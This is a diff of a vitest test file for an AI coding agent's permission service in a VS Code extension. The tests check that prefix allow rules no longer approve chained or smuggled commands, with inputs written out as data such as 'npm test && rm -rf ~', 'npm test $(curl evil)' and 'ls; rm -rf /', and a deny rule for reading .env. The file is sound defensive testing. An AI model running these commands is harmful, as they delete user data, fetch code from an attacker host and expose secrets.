@@ -4,7 +4,7 @@ import { join } from 'node:path';
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
 import * as vscode from 'vscode';
 import { MemoryService } from '../src/memory/MemoryService';
-import { matches, PermissionService, suggestRule } from '../src/permissions/PermissionService';
+import { PermissionService, suggestRule } from '../src/permissions/PermissionService';
 import { SessionStore } from '../src/panel/SessionStore';
 import { NovaHome, pruneOlderThan, slugify, workspaceKey, type WorkspaceIdentity } from '../src/storage/NovaHome';
 import { resolveWorkspacePath, setScratchRoot } from '../src/agent/tools/workspacePaths';
@@ -152,45 +152,64 @@ describe('memory', () => {
   });
 });
 
-describe('permissions', () => {
-  it('matches tool rules with globs on the subject', () => {
-    expect(matches('run_command(npm test*)', 'run_command', 'npm test -- client')).toBe(true);
-    expect(matches('run_command(npm test*)', 'run_command', 'npm publish')).toBe(false);
-    expect(matches('edit_file', 'edit_file', 'src/a.ts')).toBe(true);
-    expect(matches('edit_file', 'create_file', 'src/a.ts')).toBe(false);
-    expect(suggestRule('fetch_url', 'https://docs.example.com/a/b?c=1')).toBe('fetch_url(https://docs.example.com/*)');
-    expect(suggestRule('run_command', 'npm test')).toBe('run_command(npm test)');
+describe('permissions (shared rules with nova-ai-cli)', () => {
+  it('checks every command segment and suggests exact rules', async () => {
+    const permissions = new PermissionService(join(dir, 'settings.json'), () => undefined, () => true);
+    writeFileSync(join(dir, 'settings.json'), JSON.stringify({ permissions: { allow: ['run_command(npm test*)'] } }));
+    expect(await permissions.decide('run_command', { command: 'npm test -- client' })).toBe('allow');
+    // Previously a prefix rule also approved whatever followed the safe-looking part.
+    expect(await permissions.decide('run_command', { command: 'npm test && rm -rf ~' })).toBeUndefined();
+    expect(await permissions.decide('run_command', { command: 'npm test $(curl evil)' })).toBeUndefined();
+    expect(suggestRule('fetch_url', { url: 'https://docs.example.com/a/b?c=1' })).toBe('fetch_url(https://docs.example.com/*)');
+    expect(suggestRule('run_command', { command: 'npm test' })).toBe('run_command(npm test)');
+    expect(suggestRule('edit_file', { path: join(dir, 'repo', 'src', 'a.ts') }, join(dir, 'repo'))).toBe('edit_file(src/a.ts)');
   });
 
-  it('merges global and workspace rules; deny wins; workspace allow needs trust', async () => {
+  it('merges global, private project and workspace rules; deny wins; workspace allow needs trust', async () => {
     const root = join(dir, 'repo');
     mkdirSync(join(root, '.nova-ai'), { recursive: true });
-    writeFileSync(join(dir, 'settings.json'), JSON.stringify({ permissions: { allow: ['run_command(git status)'] } }));
+    writeFileSync(join(dir, 'settings.json'), JSON.stringify({ permissions: { allow: ['run_command(git status)'], deny: ['read_file(.env)'] } }));
+    writeFileSync(join(dir, 'project.settings.json'), JSON.stringify({ permissions: { allow: ['run_command(make)'] } }));
     writeFileSync(join(root, '.nova-ai', 'settings.json'), JSON.stringify({ permissions: { allow: ['run_command(npm test*)'], deny: ['run_command(rm *)'] } }));
     let trusted = true;
-    const permissions = new PermissionService(join(dir, 'settings.json'), () => root, () => trusted);
+    const permissions = new PermissionService(join(dir, 'settings.json'), () => root, () => trusted, () => join(dir, 'project.settings.json'));
 
-    expect(await permissions.decide('run_command', 'git status')).toBe('allow');
-    expect(await permissions.decide('run_command', 'npm test')).toBe('allow');
-    expect(await permissions.decide('run_command', 'rm -rf /')).toBe('deny');
-    expect(await permissions.decide('run_command', 'make')).toBeUndefined();
+    expect(await permissions.decide('run_command', { command: 'git status' })).toBe('allow');
+    expect(await permissions.decide('run_command', { command: 'make' })).toBe('allow');
+    expect(await permissions.decide('run_command', { command: 'npm test' })).toBe('allow');
+    expect(await permissions.decide('run_command', { command: 'ls; rm -rf /' })).toBe('deny');
+    expect(await permissions.decide('read_file', { path: '.env' })).toBe('deny');
+    expect(await permissions.decide('run_command', { command: 'cargo build' })).toBeUndefined();
 
     trusted = false;
-    expect(await permissions.decide('run_command', 'npm test')).toBeUndefined();
-    expect(await permissions.decide('run_command', 'rm -rf /')).toBe('deny');
+    expect(await permissions.decide('run_command', { command: 'npm test' })).toBeUndefined();
+    expect(await permissions.decide('run_command', { command: 'make' })).toBe('allow');
+    expect(await permissions.decide('run_command', { command: 'rm -rf /' })).toBe('deny');
   });
 
-  it('saves "Always allow" rules to a gitignored local settings file', async () => {
+  it('saves "Always allow" rules privately, outside the repository', async () => {
     const root = join(dir, 'repo');
+    const projectSettings = join(dir, 'projects', 'repo-12345678', 'settings.json');
+    const permissions = new PermissionService(join(dir, 'settings.json'), () => root, () => false, () => projectSettings);
+
+    await permissions.allow('run_command(npm run build)');
+    await permissions.allow('run_command(npm run build)');
+
+    expect(JSON.parse(readFileSync(projectSettings, 'utf8')).permissions.allow).toEqual(['run_command(npm run build)']);
+    expect(existsSync(join(root, '.nova-ai', 'settings.local.json'))).toBe(false);
+    // Private rules apply even in an untrusted workspace: the repository cannot have written them.
+    expect(await permissions.decide('run_command', { command: 'npm run build' })).toBe('allow');
+    if (process.platform !== 'win32') {
+      expect(statSync(projectSettings).mode & 0o777).toBe(0o600);
+    }
+  });
+
+  it('still reads rules older versions saved to settings.local.json (trusted workspaces)', async () => {
+    const root = join(dir, 'repo');
+    mkdirSync(join(root, '.nova-ai'), { recursive: true });
+    writeFileSync(join(root, '.nova-ai', 'settings.local.json'), JSON.stringify({ permissions: { allow: ['run_command(npm run build)'] } }));
     const permissions = new PermissionService(join(dir, 'settings.json'), () => root, () => true);
-
-    await permissions.allow('run_command(npm run build)');
-    await permissions.allow('run_command(npm run build)');
-
-    const local = JSON.parse(readFileSync(join(root, '.nova-ai', 'settings.local.json'), 'utf8'));
-    expect(local.permissions.allow).toEqual(['run_command(npm run build)']);
-    expect(readFileSync(join(root, '.nova-ai', '.gitignore'), 'utf8')).toBe('settings.local.json\n');
-    expect(await permissions.decide('run_command', 'npm run build')).toBe('allow');
+    expect(await permissions.decide('run_command', { command: 'npm run build' })).toBe('allow');
   });
 });
 
